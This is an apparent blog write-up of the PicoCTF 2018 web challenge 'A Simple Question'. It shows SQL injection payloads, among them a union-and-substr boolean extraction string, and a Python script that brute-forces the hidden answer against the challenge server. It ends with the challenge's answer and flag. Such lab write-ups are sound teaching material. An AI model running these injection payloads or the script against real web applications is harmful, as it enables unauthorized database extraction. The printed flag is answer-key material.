---
layout: post
title: Web Exploitation - A Simple Question (650) - PicoCTF 2018
categories: [general, CTFs, Web]
tags: [CTFs, picoCTF2018, Web Exploitation]
comments: true
---

The first thing I tried  is to check for an SQLI vulnerability by sending `'` as my payload. 
Lucky enough, it seems there is one, and even more than that - we actually get to see the SQL query  that was made and the error it caused. 
Knowing that we can already tell it is probably an error-based SQL injection challenge.

Here is the result: 
```text
SQL query: SELECT * FROM answers WHERE answer='''
Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "'''" in **/problems/a-simple-question_2_7cdb92e4585fe82f01b576698a830c1e/webroot/answer2.php** on line 15

Fatal error: Uncaught Error: Call to a member function fetchArray() on boolean in /problems/a-simple-question_2_7cdb92e4585fe82f01b576698a830c1e/webroot/answer2.php:17 Stack trace: #0 {main} thrown in /problems/a-simple-question_2_7cdb92e4585fe82f01b576698a830c1e/webroot/answer2.php on line 17
```

So by that we understand that we are dealing with an SQLite3 DB, and we try to retrieve `answer` from the `answers` table.
Let's try to inject `'or 1=1-- -` as this payload will prevent an error - 
```text
SQL query: SELECT * FROM answers WHERE answer=''or 1=1-- -'
You are so close.
```
So from that we can understand that when our SQL query is true, we of course don't get an error, but instead we get the string `"You are so close"`. 
We can use that to slowly **brute-force** the answer.

Basically we want to use the following payload, and each time we'll try to guess one letter that is in our answer, and we'll be able to tell if it is based on the fact that we can either get an error when false, or the string `"You are so close"` when true.
The payload: `' union select answer FROM answers where substr(answer,INDEX,1)= CHAR-- -'`
* Notice that in most cases it is common to use the `like` keyword for that kind of stuff, but because it is case-insensitive in SQLite, we'll user `substr`.

Let's recap our strategy for this challenge - we'll loop through all write-able characters, and when we don't get an error we'll increment `INDEX` by 1, and start to loop again, looking for the next valid character.

# The Script
```python
import urllib3
import requests, sys, time

http = urllib3.PoolManager()
allChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ _!"#$&()*+`-./:;<=>?@[]\\^{}|~'


flag = ""
like = "%"
i = 1
while 1:
	print (allChars[0])
	for char in allChars:
		statement = '\'  union select answer FROM answers where substr(answer,'+str(i)+',1)="'+char+'"-- -'
		r = http.request("POST", "http://2018shell1.picoctf.com:32635/answer2.php", fields={'answer':statement})
		if "close" in r.data.decode():
			flag += char
			i+=1
			print (flag)
			break
```
Answer - `41AndSixSixths`.
Flag - `picoCTF{qu3stions_ar3_h4rd_8f84b784}`.
